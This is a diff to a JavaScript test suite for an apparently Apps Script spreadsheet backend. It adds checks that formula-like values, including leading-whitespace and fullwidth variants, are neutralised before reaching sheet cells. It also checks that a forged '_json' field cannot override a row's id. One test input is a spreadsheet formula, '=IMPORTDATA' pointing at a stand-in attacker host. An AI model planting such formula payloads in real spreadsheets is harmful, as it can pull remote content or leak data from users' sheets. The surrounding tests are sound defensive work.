@@ -1085,14 +1085,23 @@ describe('GAS backend', () => {
           brokers: [
             { id: 'a', name: '=1+1', note: '+cmd' },
             { id: 'b', name: '@x', note: '-2' },
+            // A field *name* is written to the header row, so it counts too.
+            { id: 'c', '=IMPORTDATA("http://evil.example")': 'x', ' =2': 'y', '\uFF1D3': 'z' },
           ],
         },
       });
       const formulaLike = [...rt.spreadsheets.values()]
         .flatMap((ss) => [...ss.sheets.values()])
         .flatMap((sheet) => sheet.cells.flat().map(String))
-        .filter((cell) => /^[=+\-@]/.test(cell));
+        .filter((cell) => /^[\s\u3000]*[=+\-@\uFF1D\uFF0B\uFF0D\uFF20]/.test(cell));
       expect(formulaLike).toEqual([]);
+      // A field that borrows the JSON column's name cannot stand in for it.
+      ok({
+        action: 'save',
+        session,
+        tables: { accounts: [{ id: 'k', _json: '{"id":"forged"}' }] },
+      });
+      expect(ok({ action: 'load', session }).tables.accounts[0].id).toBe('k');
       // The stored rows themselves are unchanged.
       expect(ok({ action: 'load', session }).tables.brokers[0]).toEqual({
         id: 'a',
